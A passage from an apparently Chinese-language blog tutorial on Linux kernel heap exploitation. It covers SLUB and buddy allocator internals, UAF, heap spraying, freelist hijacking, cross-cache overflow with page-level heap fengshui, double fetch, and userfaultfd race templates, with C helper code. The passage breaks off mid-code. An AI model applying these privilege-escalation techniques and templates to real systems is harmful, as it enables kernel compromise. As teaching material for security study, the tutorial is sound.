的实际含义为<strong>连续的空闲页面的大小</strong>，单位是<code>阶</code>，即对于每个下标存储的页面大小为<code>2^order</code>，参考区结构体的图</p><ul><li><p>分配：</p><p>大小向 <code>2</code> 的幂次方内存页大小对齐，从对应的下标取出连续内存页，若对应下标链表为空，则会从下一个 <code>order</code> 中取出内存页，一分为二，装载到当前下标对应链表中，之后再返还给上层调用</p></li><li><p>释放：</p><p>将对应的连续内存页释放到对应的链表上，检索是否有可以合并的内存页，若有则进行合成，放入更高 <code>order</code> 的链表中</p></li></ul></li><li><p><code>slab allocator</code></p><ul><li><p>向<code>buddy system</code>请求内存页（<code>sllub</code>）并分割成同等大小的<strong>对象</strong>（<code>object</code>，被分配实体）返还给上层调用者以进行细粒度的内存管理</p></li><li><p>分为<code>slab</code>、<code>slob</code>、<code>slub</code>三种版本，其中<code>slub</code>是现在通用的版本，其结构如下：</p><img src="/2024/03/20/kernel-lou-dong-ji-li-yong/slub_allocator.png" class><p><code>slub</code> 的<strong>第一张内存页</strong>的 <strong><code>page</code> 结构体</strong>的 <strong><code>freelist</code> 成员</strong>指向该张<strong>内存页</strong>上的<strong>第一个空闲对象</strong>，一个 <code>slub</code> 上的所有空闲对象组成一个以 <code>NULL</code> 结尾的单向链表</p><blockquote><p><code>object</code> 类似<code> glibc</code> 中的 <code>chunk</code>，但是不需要<code>header</code>，因为 <code>page </code>结构体与物理内存间存在线性对应关系</p></blockquote></li><li><p><code>kmem_cache</code> ：基本的 <code>allocator</code> 组件，用于分配某个特定大小或用途的对象，所有的 <code>kmem_cache</code>构成一个双向链表，并存在两个对应的结构体数组 <code>kmalloc_caches</code> 与 <code>kmalloc_dma_caches</code></p><p>组成模块：</p><ul><li><code>kmem_cache_cpu</code>：**<code>percpu</code> 变量<strong>（以 <code>gs</code> 寄存器作为 <code>percpu</code> 段的基址，每个核心上都通过段寻址来独立保留一个副本），用以表示当前核心正在使用的 <code>slub</code>，因此当前 <code>CPU</code> 在从 <code>kmem_cache_cpu</code> 上取 <code>object </code>时</strong>不需要加锁**，极大地提高了性能</li><li><code>kmem_cache_node</code>:当前<code>kmem_cache</code>的<code> slub</code> 集散中心，其中存放着两个 <code>slub</code> 链表：<ul><li><code>partial</code>：部分 <code>object</code>空闲</li><li><code>full</code>：所有<code>object</code>都被分配出去</li></ul></li></ul></li><li><p>分配：</p><ul><li>首先从 <code>kmem_cache_cpu</code> 上取对象，若有则直接返回</li><li>若 <code>kmem_cache_cpu</code> 上的 <code>slub</code> 已经无空闲对象了，对应 <code>slub</code> 会被从 <code>kmem_cache_cpu</code> 上取下，并尝试从 <strong><code>partial</code></strong> 链表上取一个 <code>slub</code> 挂载到 <code>kmem_cache_cpu</code> 上，然后再取出空闲对象返回</li><li>若 <code>kmem_cache_node</code> 的 <code>partial</code> 链表也空了，那就<strong>向 <code>buddy system</code> 请求分配新的内存页</strong>，划分为多个 <code>object</code> 之后再给到 <code>kmem_cache_cpu</code>，取空闲对象返回上层调用</li></ul></li><li><p>释放：</p><ul><li>若被释放 <code>object</code> 属于 <code>kmem_cache_cpu</code> 的 <code>slub</code>或<code>kmem_cache_node</code> 的 <code>partial</code> 链表上的 <code>slub</code>，直接使用头插法插入当前 <code>CPU slub</code> 或对应<code>slub</code>的 <code>freelist</code></li><li>若被释放 <code>object </code>为 <code>full slub</code>，则成为对应 <code>slub</code> 的 <code>freelist</code> 头节点，<strong>且该 slub 会被放置到 partial 链表</strong></li></ul></li></ul></li></ul><h3 id="slub-allocator"><a href="#slub-allocator" class="headerlink" title="slub allocator"></a>slub allocator</h3><h4 id="kernel-UAF"><a href="#kernel-UAF" class="headerlink" title="kernel UAF"></a>kernel UAF</h4><p><strong>对于释放后未重置的垂悬指针的利用</strong>,内核的 “堆内存” 主要指的是直接映射区（<code>direct mapping area</code>）</p><h5 id="内核堆利用与绑核"><a href="#内核堆利用与绑核" class="headerlink" title="内核堆利用与绑核"></a>内核堆利用与绑核</h5><p>在多核架构下存在多个 <code>kmem_cache_cpu</code> ，利用过程中<code>kernel object</code>的分配有可能会来自不同的 <code>kmem_cache_cpu</code> ，降低了漏洞利用的成功率，因此需要将进程绑定到特定的某个 <code>CPU</code> 核心上，这样 <code>slub allocator</code> 的模型就简化成了 <code>kmem_cache_node + kmem_cache_cpu</code> </p><p>进程绑定至指定核心的模板:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token comment">/* to run the exp on the specific core only */</span><span class="token keyword">void</span> <span class="token function">bind_cpu</span><span class="token punctuation">(</span><span class="token keyword">int</span> core<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">cpu_set_t</span> cpu_set<span class="token punctuation">;</span>    <span class="token function">CPU_ZERO</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CPU_SET</span><span class="token punctuation">(</span>core<span class="token punctuation">,</span> <span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sched_setaffinity</span><span class="token punctuation">(</span><span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="通用-kmalloc-flag"><a href="#通用-kmalloc-flag" class="headerlink" title="通用 kmalloc flag"></a>通用 kmalloc flag</h5><p><code>GFP_KERNEL</code> 、 <code>GFP_KERNEL_ACCOUNT</code> ：内核中最为常见与通用的分配 <code>flag</code>，分配都来自同一个 <code>kmem_cache</code>，即通用的 <code>kmalloc-xx</code></p><p><code>GFP_KERNEL_ACCOUNT</code> 多了一个表示该对象与来自用户空间的数据相关联的属性，因此诸如 <code>msg_msg</code> 、<code>pipe_buffer</code>、<code>sk_buff</code>的数据包的分配使用的都是 <code>GFP_KERNEL_ACCOUNT</code> </p><p>而 <code>ldt_struct</code> 、<code>packet_socket</code> 等与用户空间数据没有直接关联的结构体则使用 <code>GFP_KERNEL</code></p><p>在 <code>5.9</code> 版本之前<code>GFP_KERNEL</code> 与 <code>GFP_KERNEL_ACCOUNT</code> 存在隔离机制，后来取消了隔离机制，自内核版本 <code>5.14</code> 起又重新引入：</p><ul><li>对于开启了 <code>CONFIG_MEMCG_KMEM</code> 编译选项的 <code>kernel</code> 而言（默认开启），会为使用 <code>GFP_KERNEL_ACCOUNT</code> 进行分配的通用对象创建一组独立的 <code>kmem_cache</code> ,名为 <code>kmalloc-cg-*</code> ，从而导致使用这两种 <code>flag</code> 的 <code>object</code> 之间的隔离</li></ul><h5 id="slub-合并-amp-隔离"><a href="#slub-合并-amp-隔离" class="headerlink" title="slub 合并 &amp; 隔离"></a>slub 合并 &amp; 隔离</h5><p><code>slab alias</code>机制是一种对同等或相近大小<code>object</code>的 <code>kmem_cache</code> 进行复用的机制</p><p>当一个 <code>kmem_cache</code> 在创建时，若已经存在能分配相等或近似大小的 <code>object</code>的 <code>kmem_cache</code> ，则不会创建新的<code>kmem_cache</code>，而是为原有的<code>kmem_cache</code>起一个<code>alias</code>，作为新的<code>kmem_cache</code>返回</p><p>对于初始化时设置了 <code>SLAB_ACCOUNT</code> 的 <code>kmem_cache</code> 会新建一个新的 <code>kmem_cache</code> 而非为原有的建立 <code>alias</code>,如在新版的内核当中 <code>cred_jar</code> 与 <code>kmalloc-192</code> 便是两个独立的 <code>kmem_cache</code>，<strong>彼此之间互不干扰</strong></p><h4 id="Heap-Spray"><a href="#Heap-Spray" class="headerlink" title="Heap Spray"></a>Heap Spray</h4><p><strong>堆喷射</strong>（<code>heap spraying</code>）：通过大量分配相同的结构体来达成某种特定的内存布局，应用场景：</p><ul><li><code>UAF</code>，无法通过少量内存分配拿到该结构体，例如该 <code>object</code> 不属于当前<code>freelist</code>且释放后会回到<code>node</code>上，或是像 <code>add_key()</code> 会被一直卡在第一个临时结构体上，可以通过堆喷射来确保拿到该<code>object</code></li><li>堆溢出读&#x2F;写，但是堆布局不可知，比如开启了 <code>SLAB_FREELIST_RANDOM</code>（默认开启），可以预先喷射大量特定结构体，从而保证对其中某个结构体的溢出</li></ul><h4 id="freelist劫持"><a href="#freelist劫持" class="headerlink" title="freelist劫持"></a>freelist劫持</h4><p>与用户态 <code>glibc</code> 中分配 <code>fake chunk</code> 后覆写 <code>__free_hook</code> 这样的手法类似，我们同样可以通过覆写 <code>freelist</code> 中的 <code>next</code> 指针的方式完成内核空间中任意地址上的对象分配，并修改内核当中一些有用的数据以完成提权，例如一些函数表等</p><h3 id="Buddy-System"><a href="#Buddy-System" class="headerlink" title="Buddy System"></a>Buddy System</h3><h4 id="Cross-Cache-Overflow-amp-Page-level-Heap-Fengshui"><a href="#Cross-Cache-Overflow-amp-Page-level-Heap-Fengshui" class="headerlink" title="Cross-Cache Overflow &amp; Page-level Heap Fengshui"></a>Cross-Cache Overflow &amp; Page-level Heap Fengshui</h4><h5 id="Cross-Cache-Overflow"><a href="#Cross-Cache-Overflow" class="headerlink" title="Cross-Cache Overflow"></a>Cross-Cache Overflow</h5><p>针对<code>buddy system</code>的利用手法，内存中用作不同<code>kmem_cache</code>的页面内存上可能相邻，若漏洞对象页面与溢出目标对象页面相邻，则可能实现跨越不同<code>kmem_cache</code>之间的堆溢出，但是需要非常严苛的页级堆排布，此时就需要页级堆风水</p><h5 id="Page-level-Heap-Fengshui"><a href="#Page-level-Heap-Fengshui" class="headerlink" title="Page-level Heap Fengshui"></a>Page-level Heap Fengshui</h5><p>以内存页为粒度的内存排布方式，纯手工构造一个新的已知的页级粒度内存页排布</p><p><code>slub allocator</code> 向 <code>buddy system</code> 请求页面的过程，当 <code>freelist page</code> 已经耗空且 <code>partial</code> 链表也为空时（或者 <code>kmem_cache</code> 刚刚创建后进行第一次分配时），其会向 <code>buddy system</code> 申请页面：</p><img src="/2024/03/20/kernel-lou-dong-ji-li-yong/slub-new-page.png" class><p><code>buddy system</code>其基本原理就是以 <code>2</code> 的 <code>order</code> 次幂张内存页作为分配粒度，相同 <code>order </code>间空闲页面构成双向链表，当低阶 <code>order </code>的页面不够用时便会从高阶 <code>order</code> 取一份连续内存页拆成两半，其中一半挂回当前请求 <code>order</code> 链表，另一半返还给上层调用者</p><p>从更高阶 <code>order</code> 拆分成的两份低阶 <code>order</code> 的连续内存页<strong>是物理连续的</strong>，由此我们可以：</p><ul><li>向 <code>buddy system</code> 请求两份连续的内存页</li><li>释放其中一份内存页，在 <code>vulnerable kmem_cache</code> 上堆喷，让其取走这份内存页</li><li>释放另一份内存页，在 <code>victim kmem_cache</code> 上堆喷，让其取走这份内存页</li></ul><p>此时我们便有可能溢出到其他的内核结构体上，从而完成 <code>cross-cache overflow</code></p><p>利用：<code>setsockopt</code> 与 <code>pgv </code>完成页级内存占位与堆风水</p><p>创建一个 <code>protocol</code> 为 <code>PF_PACKET</code> 的 <code>socket</code> 之后，先调用 <code>setsockopt()</code> 将 <code>PACKET_VERSION</code> 设为 <code>TPACKET_V1</code>&#x2F; <code>TPACKET_V2</code>，再调用 <code>setsockopt()</code> 提交一个 <code>PACKET_TX_RING</code> ，此时便存在如下调用链：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">__sys_setsockopt</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    sock<span class="token operator">-></span>ops<span class="token operator">-></span><span class="token function">setsockopt</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token function">packet_setsockopt</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// case PACKET_TX_RING ↓</span>            <span class="token function">packet_set_ring</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token function">alloc_pg_vec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>alloc_pg_vec()</code> 中会创建一个 <code>pgv</code> 结构体，用以分配 <code>tp_block_nr</code> 份 <code>2^order</code> 张内存页，其中 <code>order</code> 由 <code>tp_block_size</code> 决定：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">pgv</span> <span class="token operator">*</span><span class="token function">alloc_pg_vec</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tpacket_req</span> <span class="token operator">*</span>req<span class="token punctuation">,</span> <span class="token keyword">int</span> order<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> block_nr <span class="token operator">=</span> req<span class="token operator">-></span>tp_block_nr<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">pgv</span> <span class="token operator">*</span>pg_vec<span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    pg_vec <span class="token operator">=</span> <span class="token function">kcalloc</span><span class="token punctuation">(</span>block_nr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pgv</span><span class="token punctuation">)</span><span class="token punctuation">,</span> GFP_KERNEL <span class="token operator">|</span> __GFP_NOWARN<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token operator">!</span>pg_vec<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">goto</span> out<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> block_nr<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        pg_vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>buffer <span class="token operator">=</span> <span class="token function">alloc_one_pg_vec_page</span><span class="token punctuation">(</span>order<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token operator">!</span>pg_vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>buffer<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">goto</span> out_free_pgvec<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>out<span class="token operator">:</span>    <span class="token keyword">return</span> pg_vec<span class="token punctuation">;</span>out_free_pgvec<span class="token operator">:</span>    <span class="token function">free_pg_vec</span><span class="token punctuation">(</span>pg_vec<span class="token punctuation">,</span> order<span class="token punctuation">,</span> block_nr<span class="token punctuation">)</span><span class="token punctuation">;</span>    pg_vec <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">goto</span> out<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>alloc_one_pg_vec_page()</code> 中会直接调用 <code>__get_free_pages()</code> 向 <code>buddy system</code> 请求内存页，因此我们可以利用该函数进行大量的页面请求：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">alloc_one_pg_vec_page</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> order<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">;</span>    <span class="token class-name">gfp_t</span> gfp_flags <span class="token operator">=</span> GFP_KERNEL <span class="token operator">|</span> __GFP_COMP <span class="token operator">|</span>              __GFP_ZERO <span class="token operator">|</span> __GFP_NOWARN <span class="token operator">|</span> __GFP_NORETRY<span class="token punctuation">;</span>    buffer <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">__get_free_pages</span><span class="token punctuation">(</span>gfp_flags<span class="token punctuation">,</span> order<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>buffer<span class="token punctuation">)</span>        <span class="token keyword">return</span> buffer<span class="token punctuation">;</span>    <span class="token comment">//...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>相应地， <code>pgv</code> 中的页面也会在 <code>socket</code> 被关闭后释放：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">packet_release</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token function">packet_set_ring</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token function">free_pg_vec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>setsockopt()</code> 也可以帮助我们完成<strong>页级堆风水</strong>，当我们耗尽 <code>buddy system</code> 中的 <code>low order pages</code> 后，我们再请求的页面便都是物理连续的，因此此时我们再进行 <code>setsockopt()</code> 便<strong>相当于获取到了一块近乎物理连续的内存</strong>（大量的 <code>setsockopt()</code> 流程中同样会分配大量我们不需要的结构体，从而消耗 <code>buddy system</code> 的部分页面）</p><h4 id="Page-level-UAF"><a href="#Page-level-UAF" class="headerlink" title="Page-level UAF"></a>Page-level UAF</h4><p>对内存页结构体 <code>page</code> 的释放后利用，例如可以通过内存页重分配的方式将 <code>UAF page</code>分配为指定 <code>kmem_cache</code> 的 <code>slub pages</code> ，从而实现无需任何限制的跨 <code>kmem_cache</code> 的 <code>UAF</code> 利用</p><h2 id="Race-Condition"><a href="#Race-Condition" class="headerlink" title="Race Condition"></a>Race Condition</h2><h3 id="Double-Fetch"><a href="#Double-Fetch" class="headerlink" title="Double Fetch"></a>Double Fetch</h3><p>原理上属于条件竞争漏洞，是一种内核态与用户态之间的数据访问竞争</p><p>用户空间向内核传递数据时，内核通过 <code>copy_from_user</code> 等拷贝函数将用户数据拷贝至内核空间，数据复杂时只引用指针</p><p>第一次<code>fetch</code>进行校验及相关处理，将数据暂时保存在用户空间，第二次<code>fetch</code>进行数据实际处理</p><p>在两次取用数据之间，另一个用户态线程可创造条件竞争，对已通过检查的用户态数据进行篡改，造成内核验证通过数据与实际使用数据不一致形成访问越界或缓冲区溢出</p><img src="/2024/03/20/kernel-lou-dong-ji-li-yong/double-fetch.png" class><h3 id="userfaultfd的使用"><a href="#userfaultfd的使用" class="headerlink" title="userfaultfd的使用"></a>userfaultfd的使用</h3><p><code>userfaultfd</code>是一个<code>linux</code>系统调用，用户可以通过自定义的<code>page fault handler</code>在用户态处理缺页异常，流程如下图</p><img src="/2024/03/20/kernel-lou-dong-ji-li-yong/userfaultfd.png" class><p>首先要注册一个<code>userfaultfd</code>，通过<code> ioctl</code> 监视一块内存区域，同时启动一个用以进行轮询的线程 <code>uffd monitor</code>，该线程会通过 <code>poll()</code> 函数不断轮询<strong>直到出现缺页异常</strong></p><ul><li>当有一个线程在这块内存区域内触发缺页异常时（比如说第一次访问一个匿名页），该线程（称之为 <code>faulting</code> 线程）进入到内核中处理缺页异常</li><li>内核会调用 <code>handle_userfault()</code> 交由 <code>userfaultfd </code>处理</li><li>随后 <code>faulting</code> 线程进入堵塞状态，同时将一个 <code>uffd_msg</code> 发送给 <code>monitor</code> 线程，等待其处理结束</li><li><code>monitor</code> 线程调用通过 <code>ioctl</code> 处理缺页异常，有如下选项：<ul><li><code>UFFDIO_COPY</code>：将用户自定义数据拷贝到 <code>faulting page</code> 上</li><li><code>UFFDIO_ZEROPAGE</code> ：将 <code>faulting page</code> 置 <code>0</code></li><li><code>UFFDIO_WAKE</code>：用于配合上面两项中 <code>UFFDIO_COPY_MODE_DONTWAKE</code> 和 <code>UFFDIO_ZEROPAGE_MODE_DONTWAKE</code> 模式实现批量填充</li></ul></li><li>在处理结束后 <code>monitor</code> 线程发送信号唤醒 <code>faulting</code> 线程继续工作</li></ul><p>该机制最初被设计来用以进行虚拟机 &#x2F; 进程的迁移等用途，但是<strong>通过这个机制可以控制进程执行流程的先后顺序，从而使得对条件竞争的利用成功率大幅提高</strong>，比如在如下的操作时：</p><pre class="line-numbers language-none"><code class="language-none">copy_from_user(kptr, user_buf, size);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果在进入函数后，实际拷贝开始前线程被中断换下 <code>CPU</code>，别的线程执行，修改了 <code>kptr</code> 指向的内存块的所有权（比如 <code>kfree</code> 掉了这个内存块），然后再执行拷贝时就可以实现 <code>UAF</code>。这种可能性当然是比较小的，但是如果 <code>user_buf</code> 是一个 <code>mmap</code> 的内存块，并且我们为它注册了 <code>userfaultfd</code>，那么在拷贝时出现缺页异常后此线程会先执行我们注册的处理函数，在处理函数结束前线程一直被暂停，结束后才会执行后面的操作，大大增加了竞争的成功率</p><p>使用方法：</p><p>在<code>Linux man page</code>当中已经提供了 <code>userfaultfd</code> 的基本使用模板，只需要稍加修改便能直接投入到实战当中，为特定内存注册 <code>userfaultfd monitor</code> 的模板：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">err_exit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[31m\033[1m[x] Error at: \033[0m%s\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">register_userfaultfd</span><span class="token punctuation">(</span><span class="token class-name">pthread_t</span> <span class="token operator">*</span>monitor_thread<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>addr<span class="token punctuation">,</span>                          <span class="token keyword">unsigned</span> <span class="token keyword">long</span> len<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span>handler<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">long</span> uffd<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">uffdio_api</span> uffdio_api<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">uffdio_register</span> uffdio_register<span class="token punctuation">;</span>    <span class="token keyword">int</span> s<span class="token punctuation">;</span>    <span class="token comment">/* Create and enable userfaultfd object */</span>    uffd <span class="token operator">=</span> <span class="token function">syscall</span><span class="token punctuation">(</span>__NR_userfaultfd<span class="token punctuation">,</span> O_CLOEXEC <span class="token operator">|</span> O_NONBLOCK<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>uffd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">err_exit</span><span class="token punctuation">(</span><span class="token string">"userfaultfd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    uffdio_api<span class="token punctuation">.</span>api <span class="token operator">=</span> UFFD_API<span class="token punctuation">;</span>    uffdio_api<span class="token punctuation">.</span>features <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_API<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uffdio_api<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">err_exit</span><span class="token punctuation">(</span><span class="token string">"ioctl-UFFDIO_API"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    uffdio_register<span class="token punctuation">.</span>range<span class="token punctuation">.</span>start <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> addr<span class="token punctuation">;</span>    uffdio_register<span class="token punctuation">.</span>range<span class="token punctuation">.</span>len <span class="token operator">=</span> len<span class="token punctuation">;</span>    uffdio_register<span class="token punctuation">.</span>mode <span class="token operator">=</span> UFFDIO_REGISTER_MODE_MISSING<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>uffd<span class="token punctuation">,</span> UFFDIO_REGISTER<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uffdio_register<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">err_exit</span><span class="token punctuation">(</span><span class="token string">"ioctl-UFFDIO_REGISTER"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    s <span class="token operator">=</span> <span class="token function">pthread_create</span><span class="token punctuation">(</span>monitor_thread<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> handler<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> uffd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">err_exit</span><span class="token punctuation">(</span><span class="token string">"pthread_create"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以直接通过如下操作来为一块匿名的 <code>mmap</code> 内存注册 <code>userfaultfd</code>：</p><pre class="line-numbers language-none"><code class="language-none">register_userfaultfd(thread, addr, len, handler);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>需要注意的是 <code>handler</code> 的写法：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token operator">*</span>uffd_src_page <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment">// 你要拷贝进去的数据</span><span class="token keyword">static</span> <span class="token keyword">long</span> uffd_src_page_size <span class="token operator">=</span> <span class="token number">0x1000</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">fault_handler_thread</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>arg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">uffd_msg</span> msg<span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">int</span> fault_cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> uffd<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">uffdio_copy</span> uffdio_copy<span class="token punctuation">;</span>    <span class="token class-name">ssize_t</span> nread<span class="token punctuation">;</span>    uffd <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> arg<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>        <span class="token keyword">struct</span> <span class="token class-name">pollfd</span> pollfd<span class="token punctuation">;</span>        <span class="token keyword">int</span> nready<span class="token punctuation">;</span>        pollfd<span class="token punctuation">.</span>fd <span class="token operator">=</span> uffd<span class="token punctuation">;</span>        pollfd<span class="token punctuation">.</span>events <span class="token operator">=</span> POLLIN<span class="token punctuation">;</span>        nready <span class="token operator">=</span> <span class="token function">poll</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pollfd<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/*         * [在这停顿.jpg]         * 当 poll 返回时说明出现了缺页异常         * 你可以在这里插入一些比如说 sleep() 一类的操作，         * 例如等待其他进程完成对象的重分配后再重新进行拷贝一类的，也可以直接睡死 ：）         */</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>nready <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"poll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        nread <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>uffd<span class="token 